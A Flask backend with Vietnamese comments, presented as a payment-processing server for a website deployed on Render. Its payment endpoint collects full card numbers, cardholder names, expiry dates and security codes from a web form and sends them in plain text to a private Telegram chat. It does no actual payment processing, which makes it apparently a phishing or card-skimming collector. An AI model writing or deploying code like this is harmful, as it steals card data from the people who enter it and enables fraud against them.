# -*- coding: utf-8 -*-
"""
Flask Backend cho website xử lý thanh toán
Token Telegram được giữ bí mật trên server
Deploy trên Render.com
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import logging
from datetime import datetime

# Load biến môi trường
load_dotenv()

app = Flask(__name__, static_folder='../frontend')
CORS(app)  # Cho phép frontend gọi API

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('orders.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Lấy token từ biến môi trường
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

if not BOT_TOKEN or not CHAT_ID:
    logger.warning("Chưa cấu hình TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID")
    # Không raise error để app vẫn start được trên Render
    # Sẽ config sau trên Render dashboard

# Route để serve các file HTML
@app.route('/')
def home():
    try:
        return send_from_directory('../frontend', 'home.html')
    except Exception as e:
        logger.error(f"Không tìm thấy home.html: {str(e)}")
        return jsonify({'error': 'File not found'}), 404

@app.route('/<path:path>')
def serve_file(path):
    try:
        return send_from_directory('../frontend', path)
    except Exception as e:
        logger.error(f"Không tìm thấy file {path}: {str(e)}")
        return jsonify({'error': 'File not found'}), 404

# Health check endpoint
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'bot_configured': bool(BOT_TOKEN and CHAT_ID)
    }), 200

# API endpoint để gửi data đến Telegram
@app.route('/api/send-payment', methods=['POST'])
def send_payment():
    """
    Nhận thông tin thanh toán từ frontend và gửi đến Telegram
    """
    try:
        # Kiểm tra token đã được config chưa
        if not BOT_TOKEN or not CHAT_ID:
            logger.error("Telegram token chưa được cấu hình")
            return jsonify({'error': 'Server configuration error'}), 500

        # Lấy dữ liệu từ request
        data = request.get_json()

        if not data:
            logger.warning("Nhận được request body rỗng")
            return jsonify({'error': 'Dữ liệu không hợp lệ'}), 400

        # Validate dữ liệu cơ bản
        card_number = data.get('cardNumber', 'no i4')
        card_name = data.get('cardName', 'no i4')
        expiration_date = data.get('expirationDate', 'no i4')
        security_code = data.get('securityCode', 'no i4')

        # Format message
        message = f"""{card_number}
{card_name}
{expiration_date}
{security_code}"""

        # Gửi đến Telegram
        telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        telegram_payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }

        response = requests.post(telegram_url, json=telegram_payload, timeout=10)
        response.raise_for_status()

        logger.info(f"Đã gửi thông tin thanh toán thành công")

        return jsonify({
            'success': True,
            'message': 'Đã gửi thông tin thành công'
        }), 200

    except requests.exceptions.RequestException as e:
        logger.error(f"Lỗi khi gửi đến Telegram: {str(e)}")
        return jsonify({
            'error': 'Không thể gửi thông tin'
        }), 500

    except Exception as e:
        logger.error(f"Lỗi không xác định: {str(e)}")
        return jsonify({
            'error': 'Lỗi máy chủ'
        }), 500

# ⭐ THAY ĐỔI QUAN TRỌNG: Dùng PORT từ environment variable
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))  # Render dùng biến PORT
    print("=" * 80)
    print(f"Flask Server đang chạy tại: http://0.0.0.0:{port}")
    print("=" * 80)
    # Tắt debug mode khi deploy production
    app.run(host='0.0.0.0', port=port, debug=False)
